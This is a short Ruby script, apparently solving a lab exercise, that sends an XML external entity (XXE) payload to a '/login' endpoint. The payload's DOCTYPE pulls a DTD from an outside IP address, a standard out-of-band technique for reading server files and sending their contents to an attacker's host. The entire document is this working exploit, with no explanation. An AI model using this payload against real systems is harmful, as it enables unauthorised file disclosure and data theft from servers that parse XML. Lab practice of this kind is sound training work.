require 'net/http'

uri = URI.parse "http://ptl-66bb03b1-920f5e66.libcurl.so/login"
request = Net::HTTP::Post.new uri.path
request.body = <<~DESC
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://35.182.247.195:3000/test.dtd">
<foo>&e1;</foo>
DESC
request.content_type = 'text/xml'
response = Net::HTTP.new(uri.host, uri.port).start { |http| http.request request }
puts response.body
